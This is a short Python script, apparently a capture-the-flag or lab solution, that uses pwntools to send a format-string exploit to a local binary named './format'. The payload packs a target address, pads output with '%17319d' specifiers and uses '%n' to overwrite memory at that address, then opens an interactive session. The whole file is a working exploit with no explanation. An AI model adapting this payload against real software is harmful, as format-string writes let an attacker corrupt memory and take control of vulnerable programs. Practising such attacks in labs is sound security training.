from pwn import p32, process

x = b''
x += p32(0x0804c044)
x += b'%17319d ' * 3 + b'  '
x += b'%n'

d = process('./format')
d.sendline(x)
d.interactive()